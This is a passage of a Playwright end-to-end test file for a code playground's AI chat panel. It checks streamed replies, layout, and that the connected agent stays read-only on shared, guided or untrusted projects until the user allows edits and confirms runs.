      const samples: number[] = [];
      const sample = () => {
        samples.push(document.querySelector("[data-slot=agent-message]")?.textContent?.length ?? 0);
        requestAnimationFrame(sample);
      };

      Object.assign(window, { revealSamples: samples });
      requestAnimationFrame(sample);
    });

    const message = panel.getByRole("textbox", { name: "Message to the agent" });

    await message.fill("Explain slowly");
    await message.press("Enter");

    const answer = panel.locator("[data-slot=agent-message]");
    const whole = STREAMED_SENTENCES.join("").trim();

    await expect(answer).toHaveText(whole, { timeout: 30_000 });
    await expect(panel.getByRole("textbox", { name: "Message to the agent" })).toHaveAttribute(
      "placeholder",
      /Ask about this project/,
    );

    const samples = await page.evaluate(() => (window as unknown as { revealSamples: number[] }).revealSamples);
    const lengths = samples.filter((length, index) => length > 0 && length !== samples[index - 1]);
    const steps = lengths.slice(1).map((length, index) => length - (lengths[index] ?? 0));

    // Frames drop under load, so count reveals per streamed batch, not per second.
    expect(lengths.length).toBeGreaterThan(STREAMED_SENTENCES.length * 2);
    expect(steps.every((step) => step > 0)).toBe(true);
    expect(Math.max(...steps)).toBeLessThan(whole.length / 4);

    const scroller = panel.locator("[data-slot=chat-messages]").locator("..");

    expect(
      await scroller.evaluate((element) => element.scrollHeight - element.scrollTop - element.clientHeight),
    ).toBeLessThan(24);
  });

  test("should keep every output tab in view with the dock open at 1280 px, moving the run picker and status to a second row", async ({
    page,
  }) => {
    await page.setViewportSize({ width: 1280, height: 800 });
    await storeProjects(page, [record], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);

    const executionOutput = page.getByRole("region", { name: "Execution output" });
    const views = executionOutput.getByRole("tablist", { name: "Output views" });
    const status = executionOutput.getByRole("status").first();
    const fits = () => views.evaluate((list) => list.scrollWidth <= list.clientWidth);
    const rowGap = async () => ((await status.boundingBox())?.y ?? 0) - ((await views.boundingBox())?.y ?? 0);

    await expect(views.getByRole("tab", { name: /Problems/ })).toBeVisible({ timeout: 60_000 });
    expect(await fits()).toBe(true);

    expect(Math.abs(await rowGap())).toBeLessThan(10);

    await page.getByRole("button", { name: /Ask AI/ }).click();
    await expect(page.getByRole("region", { name: "AI chat" })).toBeVisible();
    await expect.poll(fits).toBe(true);
    await expect(views.getByRole("tab", { name: /Logs/ })).toBeInViewport({ ratio: 1 });
    await expect(views.getByRole("tab", { name: /Problems/ })).toBeInViewport({ ratio: 1 });
    expect(await rowGap()).toBeGreaterThan(30);
  });

  test("should lend a shared link read only: the agent reads it, and its edits and runs are refused", async ({
    page,
    context,
    request,
  }) => {
    await turnOnConnectDebug(context);

    const published = await postSnapshot(request, {
      data: { snapshotVersion: 1, name: "Shared transfers", manifest: record.manifest },
    });

    expect(published.ok(), await published.text()).toBe(true);

    const { id } = (await published.json()) as { id: string };

    await page.goto(`/s/${id}`);
    await expect(page.getByText("Shared snapshot", { exact: true })).toBeVisible({ timeout: 60_000 });

    const tab = getConnectHook(page);

    await expect.poll(() => tab.status().then((status) => status?.kind)).toBe("unpaired");
    await tab.send({ type: "pairing.create" });
    await expect.poll(() => tab.status()).toMatchObject({ kind: "pairing", connecting: false });
    await startCompanion((await tab.status())?.secret ?? "", SNAPSHOT_SCRIPT);
    await expect
      .poll(() => tab.status(), { timeout: 30_000, message: output })
      .toMatchObject({ kind: "ready", agent: "claude" });

    const shared = await tab.openProject();

    expect(shared).toMatchObject({ name: "Shared transfers", origin: "community" });

    await tab.send({ type: "chat.mode.set", mode: "edit" });
    await tab.send({
      type: "chat.message.send",
      conversation: "shared",
      text: "Read the shared link",
      project: shared,
    });
    await expect
      .poll(
        () =>
          tab
            .context()
            .then((state) => state?.activity.filter((entry) => entry.kind === "turn" && entry.state === "done").length),
        { timeout: 30_000, message: output },
      )
      .toBe(1);

    const [turn] = await agentLog(1);

    expect(turn?.results.map((item) => [item.name, item.isError])).toEqual([
      ["get_project", false],
      ["read_file", false],
      ["apply_edits", true],
      ["run", true],
    ]);
    expect(readResultData(turn?.results[0]?.text)).toMatchObject({ name: "Shared transfers", origin: "community" });
    expect(turn?.results[1]?.text).toContain("const amount = 100;");
    expect(turn?.results[2]?.text).toContain("not available on a shared link");
    expect(turn?.results[3]?.text).toContain("not available on a shared link");
    await expect(page.locator(".monaco-editor .view-lines")).toContainText("const amount = 100;");
  });

  test("should keep someone else's project read only for the AI until the user trusts it, forked by the button or the AI", async ({
    page,
    context,
    request,
  }, testInfo) => {
    await turnOnConnectDebug(context);

    const published = await postSnapshot(request, {
      data: { snapshotVersion: 1, name: "Shared transfers", manifest: record.manifest },
    });

    expect(published.ok(), await published.text()).toBe(true);

    const { id } = (await published.json()) as { id: string };
    const panel = page.getByRole("region", { name: "AI chat" });
    const note = panel.locator("[data-slot=read-only-note]");
    const message = panel.getByRole("textbox", { name: "Message to the agent" });
    // The composer takes a message only once the last turn ended.
    const say = async (text: string) => {
      await expect(panel.getByRole("button", { name: "Stop the agent" })).toHaveCount(0, { timeout: 30_000 });
      await message.fill(text);
      await message.press("Enter");
      await expect(panel.locator("[data-slot=user-message]").last()).toHaveText(text);
    };
    const shoot = async (target: ReturnType<Page["locator"]>, name: string) => {
      for (const colorScheme of ["light", "dark"] as const) {
        await page.emulateMedia({ colorScheme });
        await target.screenshot({ path: testInfo.outputPath(`${name}-${colorScheme}.png`), animations: "disabled" });
      }

      await page.emulateMedia({ colorScheme: null });
    };

    await page.goto(`/s/${id}`);
    await expect(page.getByText("Shared snapshot", { exact: true })).toBeVisible({ timeout: 60_000 });
    await page.getByRole("button", { name: /Ask AI/ }).click();
    await expect
      .poll(() =>
        getConnectHook(page)
          .status()
          .then((status) => status?.kind),
      )
      .toBe("pairing");
    await startCompanion((await getConnectHook(page).status())?.secret ?? "", TRUST_SCRIPT);
    await expect(note).toHaveText("AI can only read this. Someone else wrote it. Fork it to keep a copy.", {
      timeout: 30_000,
    });
    await expect(panel.getByRole("group", { name: "Mode" })).toHaveCount(0);
    await expect(panel.getByText("AI reads and explains only.")).toBeVisible();
    await shoot(note, "trust-shared-link-note");

    await say("Fork it for me");

    const link = panel.getByRole("link", { name: /^Open AI fork/ });

    await expect(link).toBeVisible({ timeout: 30_000 });
    await expect(
      panel.locator("[data-slot=tool-row]").filter({ has: page.locator("[data-slot=project-link]") }),
    ).toContainText("AI reads only until you allow edits");
    expect(page.url()).toMatch(new RegExp(`/s/${id}$`));

    const aiFork = (await callStore(page, "loadProjects")).find((project) => project.name === "AI fork");

    expect(aiFork).toMatchObject({ origin: "community", trust: "untrusted" });
    await expect(link).toHaveAttribute("href", `/p/${aiFork?.id}`);

    await page.getByRole("button", { name: "Fork to my projects" }).click();
    await page.waitForURL(/\/p\//);
    await waitForRun(page);
    await expect(note).toContainText("AI can only read this. Someone else wrote it.", { timeout: 30_000 });

    const trustButton = note.getByRole("button", { name: "Allow AI edits" });

    await expect(trustButton).toBeVisible();
    await shoot(note, "trust-untrusted-note");

    await say("Change and run it");
    await expect(panel.getByText("I can only read it.")).toBeVisible({ timeout: 30_000 });

    const refused = (await agentLog(2)).at(-1);

    expect(refused?.tools).not.toContain("apply_edits");
    expect(refused?.results.slice(1).map((item) => [item.name, item.text])).toEqual([
      ["apply_edits", "Unknown tool apply_edits."],
      ["run", "Unknown tool run."],
    ]);
    await expect(page.locator(".monaco-editor .view-lines")).toContainText("const amount = 100;");
    await expect(page.getByRole("region", { name: "Execution output" }).getByRole("status")).not.toHaveText(
      /^Succeeded/,
    );

    await trustButton.click();

    const dialog = page.getByRole("dialog", { name: "Allow AI edits?" });

    await expect(dialog).toHaveText(/Someone else wrote this code\. Be careful: read it first\./);
    await shoot(dialog, "trust-confirm-dialog");
    await dialog.getByRole("button", { name: "Allow AI edits" }).click();
    await expect(dialog).toHaveCount(0);
    await expect(note).toHaveCount(0);
    await expect(panel.locator("[data-slot=community-note]")).toBeVisible();

    await panel.getByRole("group", { name: "Mode" }).getByRole("button", { name: "Edit" }).click();
    await say("Make it 130");

    const bar = panel.locator("[data-slot=pending-bar]");

    await expect(bar).toContainText("1 pending edit query.ts +1 −1", { timeout: 30_000 });
    await bar.getByRole("button", { name: "Keep" }).click();
    await expect(page.locator(".monaco-editor .view-lines")).toContainText("const amount = 130;");

    await say("Run it");

    const runRequest = page.getByRole("alertdialog", { name: "Run request" });

    await expect(runRequest).toBeVisible({ timeout: 30_000 });
    await runRequest.getByRole("button", { name: "Run", exact: true }).click();
    await expect(page.getByRole("region", { name: "Execution output" }).getByRole("status")).toHaveText(/^Succeeded/, {
      timeout: 60_000,
    });
    await expect(panel.getByText("Ran it.")).toBeVisible({ timeout: 30_000 });
    await expect(page.getByRole("region", { name: "Execution output" })).toContainText("130");

    await page.getByRole("button", { name: "More actions" }).click();
    await page.getByRole("menuitem", { name: "Stop AI edits" }).click();
    await expect(note.getByRole("button", { name: "Allow AI edits" })).toBeVisible();
  });

  test("should keep a guided example's chat read only, on the guide and the docs, with the guide's tools alone", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);
    await page.route("https://orm.drizzle.team/**", (route) =>
      route.fulfill({
        status: 200,
        contentType: "text/html; charset=utf-8",
        headers: { "access-control-allow-origin": "*", "cross-origin-resource-policy": "cross-origin" },
        body: DOCS_PAGE,
      }),
    );
    await page.goto("/examples/transactions");
    await waitForRun(page);

    const rail = page.getByRole("complementary", { name: "Guide" });
    const toggle = page.getByRole("button", { name: /Ask AI/ });
    const panel = page.getByRole("region", { name: "AI chat" });

    await expect(rail).toContainText("Guide · step 1 of 3");
    await expect(rail.getByRole("tablist")).toHaveCount(0);
    await toggle.click();
    await expect(panel.getByRole("heading", { name: "Chat with your coding agent" })).toBeVisible();
    await expect
      .poll(() =>
        getConnectHook(page)
          .status()
          .then((status) => status?.kind),
      )
      .toBe("pairing");
    await startCompanion((await getConnectHook(page).status())?.secret ?? "", GUIDED_SCRIPT);

    await expect(panel.getByText("Ask only")).toBeVisible({ timeout: 30_000 });
    await expect(panel.getByText("Read-only mode", { exact: true })).toBeVisible();
    await panel.getByRole("button", { name: "What read-only mode means" }).click();
    await expect(
      page
        .getByRole("dialog")
        .getByText(/During a guide the agent reads this step, the code, the last run and the docs\./),
    ).toBeVisible();
    await page.keyboard.press("Escape");
    await expect(panel.getByText("Step 1 of 3 · Transactions and savepoints")).toBeVisible();
    await expect(panel.getByRole("group", { name: "Mode" })).toHaveCount(0);

    const question = panel.getByRole("textbox", { name: "Question about this step" });

    await expect(question).toHaveAttribute("placeholder", "Ask about this step");
    await question.fill("Why does the update stay?");
    await question.press("Enter");

    const rows = panel.locator("[data-slot=tool-row]");

    await expect(panel.getByText("It is a savepoint inside the outer transaction.")).toBeVisible({ timeout: 30_000 });
    await expect(rows.nth(0)).toContainText(/Read the guide step 1 of 3\s*get_guide/);
    await expect(rows.nth(1)).toContainText(/Read query\.ts\s*read_file/);
    await expect(rows.nth(2)).toContainText(/Read docs orm\.drizzle\.team\/docs\/transactions\s*read_docs/);
    await expect(rows).toHaveCount(3);
    await expect(panel.getByText("This needs an edit")).toHaveCount(0);

    await rows.nth(2).getByRole("button").click();
    await expect(rows.nth(2).getByRole("link", { name: "https://orm.drizzle.team/docs/transactions" })).toHaveAttribute(
      "href",
      "https://orm.drizzle.team/docs/transactions",
    );
    await expect(rows.nth(1).getByRole("button")).toHaveCount(0);

    const [turn] = await agentLog(1);

    expect(turn?.tools).toEqual([
      "get_project",
      "read_file",
      "get_problems",
      "get_latest_run",
      "get_guide",
      "read_docs",
    ]);
    expect(turn?.prompt).toContain("guided tour, read only");
    expect(turn?.results.slice(0, 3).map((item) => [item.name, item.isError])).toEqual([
      ["get_guide", false],
      ["read_file", false],
      ["read_docs", false],
    ]);
    expect(turn?.results.slice(3).map((item) => [item.name, item.text])).toEqual([
      ["apply_edits", "Unknown tool apply_edits."],
      ["run", "Unknown tool run."],
    ]);
    expect(readResultData(turn?.results[0]?.text)).toMatchObject({
      id: expect.stringMatching(/^[\da-f]{8}-[\da-f]{4}-[\da-f]{4}-[\da-f]{4}-[\da-f]{12}$/),
      position: "step 1 of 3",
      guide: { pair: [{ drizzle_orm: "1.0.0-rc.5" }] },
    });
    expect(readResultData(turn?.results[2]?.text)).toMatchObject({
      text: "# Transactions\nNested transactions are savepoints.",
    });

    await expect(rail.getByRole("button", { name: /^Run/ })).toBeVisible();
  });

  test("should create a project from the chat with Effect, link to it in a new tab, and keep the project in front", async ({
    page,
    context,
  }, testInfo) => {
    await turnOnConnectDebug(context);
    await storeProjects(page, [record], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const panel = page.getByRole("region", { name: "AI chat" });

    await page.getByRole("button", { name: /Ask AI/ }).click();
    await expect
      .poll(() =>
        getConnectHook(page)
          .status()
          .then((status) => status?.kind),
      )
      .toBe("pairing");
    await startCompanion((await getConnectHook(page).status())?.secret ?? "", CREATE_SCRIPT);
    await expect(panel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });
    await panel.getByRole("group", { name: "Mode" }).getByRole("button", { name: "Edit" }).click();

    const message = panel.getByRole("textbox", { name: "Message to the agent" });

    await message.fill("Start an Effect project");
    await message.press("Enter");

    const link = panel.getByRole("link", { name: /^Open Effect items/ });

    await expect(link).toBeVisible({ timeout: 30_000 });
    await expect(panel.getByText("Open it from the link.")).toBeVisible();
    await expect(link).toHaveAttribute("target", "_blank");
    await expect(link).toHaveAttribute("rel", "noopener");

    expect(page.url()).toMatch(new RegExp(`/p/${PROJECT_ID}$`));
    expect((await getConnectHook(page).openProject())?.id).toBe(PROJECT_ID);

    const [created, described] = (await agentLog(1)).at(-1)?.results ?? [];
    const createdData = readResultData(created?.text) as { id: string; url: string; guest_flavor: string };

    expect(createdData).toMatchObject({ guest_flavor: "effect", url: `${appOrigin}/p/${createdData.id}` });
    expect(readResultData(described?.text)).toMatchObject({ id: PROJECT_ID });
    await expect(link).toHaveAttribute("href", `/p/${createdData.id}`);

    const card = panel.locator("[data-slot=tool-row]").filter({ has: page.locator("[data-slot=project-link]") });

    for (const colorScheme of ["light", "dark"] as const) {
      await page.emulateMedia({ colorScheme });
      await card.screenshot({
        path: testInfo.outputPath(`connect-project-link-${colorScheme}.png`),
        animations: "disabled",
      });
    }

    await page.emulateMedia({ colorScheme: null });

    const [opened] = await Promise.all([context.waitForEvent("page"), link.click()]);

    await opened.waitForURL(new RegExp(`/p/${createdData.id}$`));
    await expect(opened.getByRole("button", { name: "Switch project" })).toContainText("Effect items");
    await expect(opened.getByRole("button", { name: /with Effect 4/ }).first()).toBeVisible({ timeout: 60_000 });
    await expect(opened.locator(".monaco-editor .view-lines").first()).toContainText("LibsqlDrizzle.makeWithDefaults", {
      timeout: 60_000,
    });
  });

  test("should run two tabs' chats at once from one companion, each on its own project, with a tab opened later joining on its own", async ({
    page,
    context,
  }, testInfo) => {
    await turnOnConnectDebug(context);
    await storeProjects(page, [record, otherRecord], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const bankPanel = page.getByRole("region", { name: "AI chat" });

    await page.getByRole("button", { name: /Ask AI/ }).click();
    await expect
      .poll(() =>
        getConnectHook(page)
          .status()
          .then((status) => status?.kind),
      )
      .toBe("pairing");
    await expect(bankPanel.locator("[data-slot=one-command]")).toContainText("a tab you open later joins on its own");

    for (const colorScheme of ["light", "dark"] as const) {
      await page.emulateMedia({ colorScheme });
      await bankPanel.screenshot({
        path: testInfo.outputPath(`connect-panel-setup-${colorScheme}.png`),
        animations: "disabled",
      });
    }

    await page.emulateMedia({ colorScheme: null });
    await startCompanion((await getConnectHook(page).status())?.secret ?? "", TWO_TABS_SCRIPT);
    await expect(bankPanel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });

    const shop = await context.newPage();

    await shop.goto(`/p/${OTHER_PROJECT_ID}`);
    await waitForRun(shop);

    const shopPanel = shop.getByRole("region", { name: "AI chat" });

    const shopToggle = shop.getByRole("button", { name: /Ask AI/ });

    if ((await shopToggle.getAttribute("aria-pressed")) !== "true") {
      await shopToggle.click();
    }

    await expect(shopPanel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });
    await expect.poll(() => output.match(/Linked to a Drizzle Run tab/g)?.length ?? 0).toBe(2);

    for (const panel of [bankPanel, shopPanel]) {
      await panel.getByRole("group", { name: "Mode" }).getByRole("button", { name: "Edit" }).click();
    }

    // Firefox drops a fill into a background tab.
    await page.bringToFront();
    await bankPanel.getByRole("textbox", { name: "Message to the agent" }).fill("Make it 130");
    await bankPanel.getByRole("textbox", { name: "Message to the agent" }).press("Enter");
    await shop.bringToFront();
    await shopPanel.getByRole("textbox", { name: "Message to the agent" }).fill("Make it 200");
    await shopPanel.getByRole("textbox", { name: "Message to the agent" }).press("Enter");

    await expect(bankPanel.getByRole("textbox", { name: "Message to the agent" })).toHaveAttribute(
      "placeholder",
      "Claude Code is working",
    );
    await expect(shopPanel.getByRole("textbox", { name: "Message to the agent" })).toHaveAttribute(
      "placeholder",
      "Claude Code is working",
    );
    await expect(bankPanel.getByText("Bank is on 130.")).toBeVisible({ timeout: 60_000 });
    await expect(shopPanel.getByText("Shop is on 200.")).toBeVisible({ timeout: 60_000 });
    await expect(bankPanel.getByText("Shop is on 200.")).toHaveCount(0);
    await expect(shopPanel.getByText("Bank is on 130.")).toHaveCount(0);

    await expect(page.locator(".monaco-editor .view-lines")).toContainText("const amount = 130;");
    await expect(shop.locator(".monaco-editor .view-lines")).toContainText("const amount = 200;");
    await expect(page.locator(".monaco-editor .view-lines")).not.toContainText("200");
    await expect(shop.locator(".monaco-editor .view-lines")).not.toContainText("130");

    const turns = await agentLog(2);
    const argvs = turns.map((turn) => turn.argv);

    expect(turns).toHaveLength(2);
    expect(argvs.every((argv) => argv.includes("--session-id") && !argv.includes("--resume"))).toBe(true);
    expect(new Set(argvs.map(sessionOf)).size).toBe(2);

    for (const turn of turns) {
      expect(turn.results.map((result) => [result.name, result.isError])).toEqual([
        ["get_project", false],
        ["apply_edits", false],
        ["run", false],
      ]);
    }
  });
});
